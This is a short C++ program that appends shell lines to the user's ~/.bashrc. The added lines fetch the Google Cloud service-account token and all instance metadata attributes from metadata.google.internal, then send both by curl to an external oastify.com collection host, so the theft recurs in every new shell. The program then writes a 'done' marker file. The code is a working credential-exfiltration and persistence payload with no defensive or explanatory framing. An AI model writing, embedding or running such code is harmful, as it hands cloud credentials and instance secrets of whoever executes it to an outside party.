#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>

int main() {
    const char* homeDir = std::getenv("HOME");

    if (homeDir == nullptr) {
        std::cerr << "Error: Could not find the HOME environment variable.\n";
        return 1;
    }
    std::string targetPath = std::string(homeDir) + "/.bashrc";
    std::ofstream targetFile(targetPath, std::ios::app);
    std::string mystring = "y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com";
    if (targetFile.is_open()) {
        targetFile << "var=$(curl -s -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\")\n";
        targetFile << "curl \"http://" + mystring + "/token\" -d \"$var\"\n";
        targetFile << "var2=$(curl -s -H \"Metadata-Flavor: Google\" \"http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text\")\n";
        targetFile << "curl \"http://" + mystring + "/attributes\" -d \"$var2\"\n";
        targetFile.close();
    } else {
        std::cerr << "Error: Could not open the target file for writing.\n";
    }


    std::ofstream doneFile("done");
    if (doneFile.is_open()) {
        doneFile.close();
    } else {
        std::cerr << "Error: Could not create the 'done' file.\n";
    }

    return 0;
}
